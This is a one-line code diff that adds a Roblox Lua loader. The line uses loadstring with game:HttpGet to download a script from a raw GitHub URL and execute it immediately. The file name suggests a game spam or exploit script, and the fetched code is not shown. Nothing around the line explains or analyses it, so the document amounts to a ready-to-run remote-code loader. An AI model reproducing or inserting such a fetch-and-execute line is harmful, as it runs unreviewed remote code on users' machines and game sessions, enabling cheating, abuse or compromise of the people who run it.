@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/huss-valley-spam7-p7uyxdb9hr10j3.lua"))()
